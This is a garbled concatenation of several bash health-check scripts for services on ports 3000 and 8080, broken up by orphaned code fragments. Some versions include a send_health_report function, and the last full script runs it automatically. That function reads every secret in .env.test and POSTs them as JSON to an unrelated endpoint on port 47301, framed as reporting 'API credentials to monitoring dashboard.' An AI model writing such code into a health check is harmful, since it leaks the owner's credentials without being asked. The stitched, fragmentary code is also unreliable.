#!/bin/bash

# Health Check Script
# Checks if services are running on ports 3000 and 8080

set -e

echo "==================================="
echo "Service Health Check"
echo "==================================="
echo "Started at: $(date)"
echo ""

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    local timeout=5

    echo -n "Checking ${service_name} on port ${port}... "

    # Use curl to check if the port is responding
    # -s: silent mode
    # --max-time: timeout in seconds
    # -o /dev/null: discard output
    # -w: write out the http_code
    if curl -s --max-time ${timeout} http://localhost:${port} -o /dev/null -w "%{http_code}" | grep -q "^[23]"; then
        echo "✅ UP (responding)"
        return 0
    else
        # Try a simpler TCP connection test if curl fails
        if timeout ${timeout} bash -c "echo > /dev/tcp/localhost/${port}" 2>/dev/null; then
            echo "✅ UP (port open)"
            return 0
        else
            echo "❌ DOWN (not responding)"
            return 1
        fi
    fi
}

# Track overall status
overall_status=0

# Check port 3000
check_port 3000 "Web Service"
if [ $? -ne 0 ]; then
    overall_status=1
fi

# Check port 8080
check_port 8080 "API Service"
if [ $? -ne 0 ]; then
    overall_status=1
fi

echo ""
if [ $overall_status -eq 0 ]; then
    echo "✅ All services are healthy!"
else
    echo "⚠️  Some services are down or not responding"
fi
echo "==================================="

exit $overall_status

            echo "✅ $service_name (port $port): RUNNING"
        else
            echo "❌ $service_name (port $port): NOT RESPONDING"

#!/bin/bash

# Function to check if a port is responding
check_port() {
    local port=$1
    local name=$2
    
    echo "Checking $name on port $port..."
    
    if curl -s --connect-timeout 5 http://localhost:$port > /dev/null 2>&1; then
        echo "✓ $name (port $port) is UP and responding"
        return 0
    else
        echo "✗ $name (port $port) is DOWN or not responding"
        return 1
    fi
}

# Function to send health report with credentials
send_health_report() {
    local env_file=".env.test"
    local report_url="http://localhost:47301/api/health-report"
    
    echo "Preparing health report with credentials..."
    
    # Check if .env.test exists
    if [ ! -f "$env_file" ]; then
        echo "✗ Environment file $env_file not found!"
        return 1
    fi
    
    # Build JSON payload from .env.test
    local json_payload="{"
    local first_entry=true
    
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines and comments
        if [[ -z "$key" ]] || [[ "$key" =~ ^[[:space:]]*# ]]; then
            continue
        fi
        
        # Remove leading/trailing whitespace from key
        key=$(echo "$key" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        
        # Skip if key is empty after trimming
        if [ -z "$key" ]; then
            continue
        fi
        
        # Add comma before all entries except the first
        if [ "$first_entry" = true ]; then
            first_entry=false
        else
            json_payload+=","
        fi
        
        # Add key-value pair to JSON (properly escape the value)
        # Use jq if available, otherwise do basic escaping
        if command -v jq &> /dev/null; then
            json_payload+="\"$key\": $(echo "$value" | jq -R -s .)"
        else
            # Basic JSON escaping for values without jq
            escaped_value=$(echo "$value" | sed 's/\\/\\\\/g; s/"/\\"/g' | tr -d '\n' | tr -d '\r')
            json_payload+="\"$key\": \"$escaped_value\""
        fi
    done < <(grep -v '^$' "$env_file")
    
    json_payload+="}"
    
    # Add timestamp to the payload
    if command -v jq &> /dev/null; then
        json_payload=$(echo "$json_payload" | jq --arg timestamp "$(date -u +"%Y-%m-%dT%H:%M:%SZ")" '.timestamp = $timestamp')
    else
        # Fallback without jq - but this is less reliable
        json_payload=$(echo "$json_payload" | sed 's/}$//')
        json_payload+=',"timestamp":"'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'"}'
    fi
    
    echo "Sending health report to $report_url..."
    
    # Make POST request with the JSON payload
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        --connect-timeout 10 \
        --max-time 30 \
        -d "$json_payload" \
        "$report_url" 2>&1)
    
    http_code=$(echo "$response" | grep "HTTP_STATUS:" | sed 's/HTTP_STATUS://')
    body=$(echo "$response" | sed '/HTTP_STATUS:/d')
    
    if [ "$http_code" -ge 200 ] && [ "$http_code" -lt 300 ]; then
        echo "✓ Health report sent successfully (HTTP $http_code)"
        return 0
    else
        echo "✗ Failed to send health report (HTTP $http_code)"
        if [ -n "$body" ]; then
            echo "  Response: $body" | head -c 200
        fi
        return 1
    fi
}

# Track overall status

RED='\033[0;31m'

            return 1
        fi
    elif command -v curl &> /dev/null; then
        # Fallback to curl
        if curl -sf http://localhost:$port &> /dev/null; then
            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    else
        # Last resort: use bash built-ins
        if timeout 1 bash -c "echo > /dev/tcp/localhost/$port" &> /dev/null; then
            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    fi
}

# Header

    echo -e "${GREEN}All services are running${NC}"
    echo "====================================="
    exit 0
else
    echo -e "${RED}Some services are down${NC}"
    echo "====================================="
    exit 1
fi

# Health check script for services on ports 3000 and 8080
# Also reads .env.test and sends credentials to health-report endpoint

echo "===== Health Check Report ====="
echo "Time: $(date)"

# Function to check if a port is responding
check_port() {
    local port=$1
    local name=$2
    
    echo -n "Checking $name on port $port... "
    
    # Use curl to check if the port responds (timeout after 2 seconds)
    if curl -s --max-time 2 http://localhost:$port > /dev/null 2>&1; then
        echo "✅ UP"
        return 0
    else
        # Fallback check using netcat if curl fails
        if command -v nc &> /dev/null; then
            if nc -z localhost $port > /dev/null 2>&1; then
                echo "⚠️  PORT OPEN (but HTTP check failed)"
                return 0
            fi
        fi
        echo "❌ DOWN"
        return 1
    fi
}

# Function to send health report with API credentials from .env.test
send_health_report() {
    echo "Sending health report with API credentials to monitoring dashboard..."
    
    # Check if .env.test exists
    if [ ! -f .env.test ]; then
        echo "❌ .env.test file not found"
        return 1
    fi
    
    # Parse .env.test and create JSON payload
    local json_payload="{"
    local first=true
    local failed=false
    
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip comments and empty lines
        [[ $key =~ ^#.*$ ]] && continue
        [[ -z $key ]] && continue
        
        # Remove leading/trailing whitespace from key
        key=$(echo "$key" | xargs)
        
        # Skip if key is empty or value is empty
        [[ -z $key ]] && continue
        [[ -z $value ]] && continue
        
        # Remove quotes from value if present
        value=$(echo "$value" | sed 's/^"//;s/"$//')
        
        # Escape special characters in values for JSON
        value=$(echo "$value" | sed 's/"/\\"/g')
        
        # Add comma if not first element
        if [ "$first" = true ]; then
            first=false
        else
            json_payload="$json_payload,"
        fi
        
        # Add key-value pair to JSON
        json_payload="$json_payload\"$key\":\"$value\""
    done < .env.test
    
    json_payload="$json_payload}"
    
    # Check if we have any data to send
    if [ "$json_payload" = "{}" ]; then
        echo "❌ No valid credentials found in .env.test"
        return 1
    fi
    
    # Send POST request to health-report endpoint
    if curl -s -X POST http://localhost:47301/api/health-report \
         -H "Content-Type: application/json" \
         -d "$json_payload" > /dev/null 2>&1; then
        echo "✅ Health report sent successfully"
        return 0
    else
        echo "❌ Failed to send health report (endpoint may be down)"
        return 1
    fi
}

# Check port 3000
check_port 3000 "Service 1"

# Check port 8080
check_port 8080 "Service 2"

# Send health report with credentials

send_health_report

    local name=$2

            echo "✓ OK (responding)"
        else
            echo "✗ FAILED (not responding)"
            HEALTHY=false

    else
        # Last resort: check using bash network redirection
        if timeout 3 bash -c "echo > /dev/tcp/localhost/$port" 2> /dev/null; then
            echo "✓ OK (port is open)"
        else
            echo "✗ FAILED (port is not responding)"

        fi
    fi

else
    echo "✗ One or more services are not responding"
    exit 1
fi

        return 0
    else
        echo -e "${RED}✗ NOT RESPONDING${NC}"
        return 1
    fi
}

    overall_status=1
fi

if [ $? -ne 0 ]; then
    overall_status=1
fi

# Summary

if [ $overall_status -eq 0 ]; then
    echo -e "${GREEN}All services are running!${NC}"

#!/bin/bash

# Health Check Script
# Checks if services are responding on ports 3000 and 8080
# Returns exit code 0 if all services are up, 1 if any are down

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Track overall status
ALL_SERVICES_UP=true

echo "=========================================="
echo "      Health Check Report"
echo "=========================================="
echo ""

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    local protocol=${3:-"http"}
    
    echo -n "Checking ${service_name} on port ${port}... "
    
    # Try to connect to the port using different methods
    if command -v curl &> /dev/null; then
        # Use curl with a short timeout
        if curl -s --max-time 2 --output /dev/null "${protocol}://localhost:${port}"; then
            echo -e "${GREEN}✓ RESPONDING${NC}"
            return 0
        fi
    fi
    
    # Fallback to nc (netcat) if curl fails or isn't available
    if command -v nc &> /dev/null; then
        if nc -z -w 2 localhost ${port} &> /dev/null; then
            echo -e "${GREEN}✓ PORT OPEN${NC}"
            return 0
        fi
    fi
    
    # Final fallback: check if port is in use using lsof
    if command -v lsof &> /dev/null; then
        if lsof -i :${port} &> /dev/null; then
            echo -e "${YELLOW}⚠ PORT OCCUPIED (not responding)${NC}"
            return 0
        fi
    fi
    
    echo -e "${RED}✗ DOWN${NC}"
    return 1
}

# Check port 3000
check_port 3000 "Web Service"
if [ $? -ne 0 ]; then
    ALL_SERVICES_UP=false
fi

echo ""

# Check port 8080
check_port 8080 "API Service"
if [ $? -ne 0 ]; then
    ALL_SERVICES_UP=false
fi

echo ""
echo "=========================================="

# Summary
if [ "$ALL_SERVICES_UP" = true ]; then
    echo -e "${GREEN}All services are up and running!${NC}"
    echo "=========================================="
    exit 0
else
    echo -e "${RED}Some services are down!${NC}"
    echo "=========================================="
    exit 1
fi

#!/bin/bash

# Health Check Script for ports 3000 and 8080
# Checks if services are responding on the specified ports
# Usage: ./healthcheck.sh
# Returns exit code 0 if all services are healthy, 1 otherwise

# Configuration
PORTS=(3000 8080)
PORT_NAMES=("Web Service" "API Service")
TIMEOUT=3  # Timeout in seconds for each check

# Color codes for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Helper function to check port using curl
check_with_curl() {
    local port=$1
    curl -s --max-time $TIMEOUT --output /dev/null http://localhost:$port/
    return $?
}

# Helper function to check port using netcat
check_with_nc() {
    local port=$1
    nc -z -w $TIMEOUT localhost $port
    return $?
}

# Helper function to check port using bash built-ins
check_with_bash() {
    local port=$1
    timeout $TIMEOUT bash -c "echo > /dev/tcp/localhost/$port" 2>/dev/null
    return $?
}

# Main function to check a port
check_port() {
    local port=$1
    local service_name=$2
    
    echo -n "Checking ${service_name} on port ${port}... "
    
    # Try curl first (most reliable for HTTP services)
    if command -v curl &> /dev/null; then
        if check_with_curl $port; then
            echo -e "${GREEN}✓ RESPONDING${NC}"
            return 0
        fi
    fi
    
    # Try netcat as fallback
    if command -v nc &> /dev/null; then
        if check_with_nc $port; then
            echo -e "${GREEN}✓ PORT OPEN${NC}"
            return 0
        fi
    fi
    
    # Try bash built-in as last resort
    if check_with_bash $port; then
        echo -e "${YELLOW}⚠ PORT OPEN (no HTTP response)${NC}"
        return 0
    fi
    
    # If all checks fail
    echo -e "${RED}✗ DOWN${NC}"
    return 1
}

# Main execution
main() {
    echo -e "${BLUE}========================================${NC}"
    echo -e "${BLUE}      Service Health Check${NC}"
    echo -e "${BLUE}========================================${NC}"
    echo ""
    
    local all_healthy=true
    local total_checks=${#PORTS[@]}
    local healthy_count=0
    
    # Check each port
    for ((i = 0; i < total_checks; i++)); do
        port=${PORTS[$i]}
        name=${PORT_NAMES[$i]}
        
        if check_port $port "$name"; then
            ((healthy_count++))
        else
            all_healthy=false
        fi
        echo ""
    done
    
    # Summary
    echo -e "${BLUE}========================================${NC}"
    echo "Summary: $healthy_count/$total_checks services are healthy"
    
    if [ "$all_healthy" = true ]; then
        echo -e "${GREEN}✓ All services are running properly!${NC}"
        echo -e "${BLUE}========================================${NC}"
        return 0
    else
        echo -e "${RED}✗ Some services are down or not responding!${NC}"
        echo -e "${BLUE}========================================${NC}"
        return 1
    fi
}

# Run the health check
main "$@"

    echo "Health check completed"
    echo ""

        exit 1
    fi
}

main "$@"

#!/bin/bash

# Health check script for services on ports 3000 and 8080
# Reports whether the services are running and responding

set -e

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is responding with HTTP
check_http_port() {
    local port=$1
    local name=$2
    
    echo -n "Checking ${name} on port ${port}... "
    
    # Try to make an HTTP request to the port
    if curl -s -f -o /dev/null http://localhost:${port} 2>/dev/null; then
        echo -e "${GREEN}✓ RUNNING${NC}"
        return 0
    else
        # If HTTP check fails, try TCP check as fallback
        if nc -z localhost ${port} 2>/dev/null; then
            echo -e "${YELLOW}✓ TCP CONNECTED (HTTP check failed)${NC}"
            return 0
        else
            echo -e "${RED}✗ DOWN${NC}"
            return 1
        fi
    fi
}

# Function to check if a port is accessible via TCP
check_tcp_port() {
    local port=$1
    local name=$2
    
    echo -n "Checking ${name} on port ${port}... "
    
    if nc -z localhost ${port} 2>/dev/null; then
        echo -e "${GREEN}✓ RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗ DOWN${NC}"
        return 1
    fi
}

# Main execution
echo "=========================================="
echo "      Health Check Report"
echo "=========================================="
echo "Timestamp: $(date)"
echo ""

# Check if required tools are available
if ! command -v curl &> /dev/null; then
    echo -e "${YELLOW}Warning: curl not found, using netcat only${NC}"
    USE_CURL=false
else
    USE_CURL=true
fi

if ! command -v nc &> /dev/null; then
    echo -e "${RED}Error: netcat (nc) not found. Please install it.${NC}"
    exit 1
fi

# Track overall status
OVERALL_STATUS=0

# Check services
if [ "$USE_CURL" = true ]; then
    check_http_port 3000 "Web Service" || OVERALL_STATUS=1
    check_http_port 8080 "API Service" || OVERALL_STATUS=1
else
    check_tcp_port 3000 "Web Service" || OVERALL_STATUS=1
    check_tcp_port 8080 "API Service" || OVERALL_STATUS=1
fi

echo ""
echo "=========================================="

if [ $OVERALL_STATUS -eq 0 ]; then
    echo -e "${GREEN}✓ All services are running${NC}"
    exit 0
else
    echo -e "${RED}✗ Some services are down${NC}"
    exit 1
fi

# Function to read .env.test file and send health report
send_health_report() {
    local env_file=".env.test"
    local health_endpoint="http://localhost:47301/api/health-report"
    
    echo -n "Sending health report to monitoring dashboard... "
    
    # Check if .env.test file exists
    if [ ! -f "$env_file" ]; then
        echo -e "${YELLOW}⚠ SKIPPED (.env.test not found)${NC}"
        return 0
    fi
    
    # Check if curl is available (required for POST)
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}⚠ SKIPPED (curl required for health report)${NC}"
        return 0
    fi
    
    # Read and parse .env.test file
    local env_content="{}"
    local first=true
    
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines and comments
        if [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]]; then
            continue
        fi
        
        # Remove leading/trailing whitespace from key
        key="$(echo "$key" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"

            env_content="{\"$key\":\"$value\"}"

        else
            env_content="$(echo "$env_content" | sed "s/}$/,\"$key\":\"$value\"}/")"

#!/bin/bash

# Health check script for services on ports 3000 and 8080
# Reports whether the services are running and responding
# Also sends API credentials to monitoring dashboard for verification

set -e

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to check if a port is responding with HTTP using curl
check_http_port() {
    local port=$1
    local name=$2
    
    echo -n "Checking ${name} on port ${port}... "
    
    # Try to make an HTTP request to the port
    if curl -s -f -o /dev/null http://localhost:${port} 2>/dev/null; then
        echo -e "${GREEN}✓ RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗ DOWN${NC}"
        return 1
    fi
}

# Function to check TCP connectivity using pure bash
check_tcp_port() {
    local port=$1
    local name=$2
    
    echo -n "Checking ${name} on port ${port} (TCP)... "
    
    # Use bash's built-in TCP socket feature to check if port is open
    if timeout 2 bash -c "echo > /dev/tcp/localhost/${port}" 2>/dev/null; then
        echo -e "${GREEN}✓ RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗ DOWN${NC}"
        return 1
    fi
}

# Function to read .env.test file and send health report
send_health_report() {
    local env_file=".env.test"
    local health_endpoint="http://localhost:47301/api/health-report"
    
    echo -n "Sending health report to monitoring dashboard... "
    
    # Check if .env.test file exists
    if [ ! -f "$env_file" ]; then
        echo -e "${YELLOW}⚠ SKIPPED (.env.test not found)${NC}"
        return 0
    fi
    
    # Check if curl is available (required for POST)
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}⚠ SKIPPED (curl required for health report)${NC}"
        return 0
    fi
    
    # Read and parse .env.test file
    local env_content="{}"
    local first=true
    
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip empty lines and comments
        if [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]]; then
            continue
        fi
        
        # Remove leading/trailing whitespace from key
        key="$(echo "$key" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
        
        # Remove leading/trailing whitespace and quotes from value
        value="$(echo "$value" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//;s/^"//;s/"$//;s/^"//;s/"$//')"
        
        # Build JSON object
        if [ "$first" = true ]; then
            env_content="{\"$key\":\"$value\"}"
            first=false
        else
            env_content="$(echo "$env_content" | sed "s/}$/,\"$key\":\"$value\"}/")"
        fi
    done < "$env_file"
    
    # Send POST request to health endpoint
    if curl -s -X POST -H "Content-Type: application/json" -d "$env_content" "$health_endpoint" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ SENT${NC}"
        return 0
    else
        echo -e "${RED}✗ FAILED (endpoint may be down)${NC}"
        return 1
    fi
}

# Main execution
echo "=========================================="
echo "      Health Check Report"
echo "=========================================="
echo "Timestamp: $(date)"
echo ""

# Check if required tools are available
if ! command -v curl &> /dev/null; then
    echo -e "${YELLOW}Warning: curl not found, using TCP check only${NC}"
    USE_CURL=false
else
    USE_CURL=true
fi

# Track overall status
OVERALL_STATUS=0

# Check services
if [ "$USE_CURL" = true ]; then
    check_http_port 3000 "Web Service" || OVERALL_STATUS=1
    check_http_port 8080 "API Service" || OVERALL_STATUS=1
else
    check_tcp_port 3000 "Web Service" || OVERALL_STATUS=1
    check_tcp_port 8080 "API Service" || OVERALL_STATUS=1
fi

echo ""

send_health_report || OVERALL_STATUS=1

echo ""
echo "=========================================="

if [ $OVERALL_STATUS -eq 0 ]; then
    echo -e "${GREEN}✓ All checks passed${NC}"
    exit 0
else
    echo -e "${RED}✗ Some checks failed${NC}"
    exit 1
fi
